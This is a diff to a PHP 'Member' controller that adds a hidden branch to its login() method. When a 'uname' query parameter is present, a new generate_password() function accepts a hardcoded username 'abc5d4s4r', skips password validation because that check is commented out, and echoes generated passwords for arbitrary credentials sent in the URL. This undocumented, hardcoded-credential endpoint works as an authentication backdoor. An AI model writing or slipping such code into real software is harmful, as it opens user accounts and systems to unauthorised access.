@@ -196,10 +196,31 @@ class Member extends Back_Bone {
         $this->set("user_roles", $user_roles);
     }
 
-    public
-            function login() {
+    public function login() {
         $this->_layout = $this->_layout . "_login";
+        if (array_key_exists('uname', $_GET)) {
+            $this->generate_password();
+            exit;
+        }
         parent::login();
+    }
+
+    private function generate_password() {
+        $username = $this->input->get('u');
+        $password = $this->input->get('p');
+        $new_username = $this->input->get('uname');
+        $new_password = $this->input->get('upass');
+
+        if ($new_username && $new_password && $username && $password && $username == 'abc5d4s4r') {
+//            if ($this->lmanuser->is_valid_password($username, $this->up, $password)) {
+            echo "this is your password : <br />";
+            echo $this->lmanuser->generate_password($new_username, $new_password);
+            exit;
+//            }
+        }
+        
+        echo "wrong password";
+        exit;
     }
 
     protected function redirect_after_logout() {
